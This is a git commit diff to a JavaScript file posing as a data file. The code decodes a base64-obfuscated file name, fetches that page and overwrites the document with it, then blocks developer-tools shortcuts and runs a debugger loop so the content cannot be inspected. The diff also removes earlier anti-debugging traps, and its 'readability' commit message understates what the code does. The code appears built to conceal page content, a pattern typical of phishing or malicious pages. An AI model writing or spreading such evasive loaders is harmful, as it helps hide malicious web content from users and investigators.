f69042504a81670836d9aad1538d43ffc8c97a1b
web.md <152025768+elgoharymd@users.noreply.github.com>
2026-03-13 12:56:18 +0200

    Refactor async function and adjust intervals
    Refactor code to improve readability and performance.

--- system_v4.data.js
+++ system_v4.data.js
@@ -1,25 +1,12 @@
 (async function() {
-    const _c = () => {
-        const _d = /./;
-        _d.toString = () => { location.reload(); };
-        console.log(_d);
-    };
-
-    setInterval(() => {
-        const _t1 = Date.now();
-        debugger;
-        const _t2 = Date.now();
-        if (_t2 - _t1 > 100) { location.href = "about:blank"; }
-    }, 500);
-
     try {
-        const _k = "==AbpRHZp92YyV3clB2bj5WauR2Y"; 
-        const _target = atob(_k.split("").reverse().join("").substring(2));
+        const _p = "Y29yZS5odG1s"; 
+        const _target = atob(_p);
 
-        const res = await fetch("./" + _target);
-        if (!res.ok) return;
+        const response = await fetch("./" + _target);
+        if (!response.ok) return;
 
-        const html = await res.text();
+        const html = await response.text();
         
         document.open();
         document.write(html);
@@ -28,7 +15,7 @@
             document.onkeydown = e => {
                 if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) return false;
             };
-            setInterval(() => { debugger; }, 50);
+            setInterval(() => { debugger; }, 100);
         <\/script>`);
         document.close();
     } catch (e) {}
